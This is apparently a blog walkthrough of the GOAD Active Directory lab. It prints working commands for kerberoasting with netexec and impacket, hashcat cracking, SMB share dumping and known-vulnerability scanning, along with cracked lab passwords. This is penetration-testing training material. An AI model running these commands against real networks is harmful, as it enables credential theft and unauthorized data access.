---
title: "GOAD Part 2: Domain Enumeration "
author: "Trevor Saudi"
date: 2024-10-14
description: ""
draft: false
subtitle: ""
tags:
- Active Directory
- Pentesting
---

<style>



@import url('https://cdn.rawgit.com/lonekorean/gist-syntax-themes/d49b91b3/stylesheets/one-dark.css');

@import url('https://fonts.googleapis.com/css?family=Open+Sans');


   
  *, ::before, ::after {
    border-style: none;
    font: 16px;

  }

  body {
  margin: 20px;
  font: 16px 'Open Sans', sans-serif;
}

.center { 
       display:inline-block; 
       margin-left: 60px; 
       margin-top: -20px;
}

</style>



## Introduction

- In the previous walkthrough we exploited various misconfigurations and obtained some valid domain user credentials.
- With valid credentials, we can perform more enumeration using tools like bloodhound and also explore various attacks such as kerberoasting.
 We will explore kerberoasting and domain enumeration using bloodhound.....


### Kerberoasting in the north domain

 ![image](/posts/2024-10-10_red_team08/images/kerberoasting.png)

- With our valid credentials we can try and abuse kerberoasting to obtain more credential material that can grant further access to systems and data. 

- Kerberoasting involves attempting to crack passwords of service accounts by exploiting the Kerberos authentication protocol. 
- We obtain service tickets associated with these accounts and then perform offline password cracking.
- Using netexec:

```bash
nxc ldap 192.168.56.11 -u brandon.stark -p 'iseedeadpeople' -d north.sevenkingdoms.local --kerberoasting KERBEROASTING
```

 ![image](/posts/2024-10-10_red_team08/images/kerberoasting3.png)


- Using impacket:

```python
impacket-GetUserSPNs -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople
```
 ![image](/posts/2024-10-10_red_team08/images/kerberoasting2.png)

- We obtain 3 kerberoastable users: sansa.stark, jon.snow and sql_svc

#### Cracking with hashcat



- Running hashcat in the following mode with a rockyou password list:

 ![image](/posts/2024-10-10_red_team08/images/kerberoasting5.png)

- we get the plaintext credentials of the jon.snow user.

```python
hashcat -m 13100 -a 0 KERBEROASTING /usr/share/wordlists/rockyou.txt.gz
```
 ![image](/posts/2024-10-10_red_team08/images/kerberoasting4.png)


{{< alert "circle-info" >}}
jon.snow: iknownothing
{{< /alert >}}


### Spidering and Dumping Shares

 ![image](/posts/2024-10-10_red_team08/images/shares2.png)


- Check for shares and permissions on them

```python
 nxc smb 192.168.56.10-23 -u jon.snow -p iknownothing -d north.sevenkingdoms.local --shares

```

 ![image](/posts/2024-10-10_red_team08/images/shares.png)


- Dump all files from all the readable shares

```python
 nxc smb 192.168.56.10-23 -u jon.snow -p iknownothing -d north.sevenkingdoms.local -M spider_plus -o DOWNLOAD_FLAG=TRUE
```

 ![image](/posts/2024-10-10_red_team08/images/spider.png)

- We have a couple of interesting dumped files 

 ![image](/posts/2024-10-10_red_team08/images/crt.png)

 - We discover credentials to jeor.mormont user.

 ![image](/posts/2024-10-10_red_team08/images/creds.png)


{{< alert "circle-info" >}}
jeor.mormont: \_L0ngCl@w\_

{{< /alert >}}


 ![image](/posts/2024-10-10_red_team08/images/jeor.png)


## Known Vulnerabilities

 ![image](/posts/2024-10-10_red_team08/images/known-vulns.png)


- Some of these vulnerabilities require credentials to enumerate so we will use a domain user's credentials with netexec, to check the various known vulnerabilities

```python
 nxc smb 192.168.56.10-23 -u 'jon.snow' -p 'iknownothing' -M zerologon -M nopac -M printnightmare -M smbghost -M ms17-010   
```
- We are able to identify printnightmare and nopac on winterfell:

 ![image](/posts/2024-10-10_red_team08/images/vulns.png)
